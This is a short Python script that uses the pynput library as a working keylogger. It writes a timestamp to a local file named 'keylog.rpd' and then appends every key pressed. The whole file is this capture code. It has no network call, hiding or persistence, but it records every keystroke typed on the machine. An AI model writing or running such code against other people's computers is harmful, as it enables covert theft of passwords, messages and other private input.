from pynput.keyboard import Key, Listener
import os
from datetime import datetime
keyl = open('keylog.rpd','a')
now = datetime.now()
dt = now.strftime("\n%d/%m/%Y\n%H:%M:%S\n")
keyl.write(dt)
keyl.close()

def on_press(key):
    keyl = open('keylog.rpd','a')
    print(key)
    keyl.write(" "+str(key)+" ")
    keyl.close()
    
with Listener(on_press) as listener:
    listener.join()
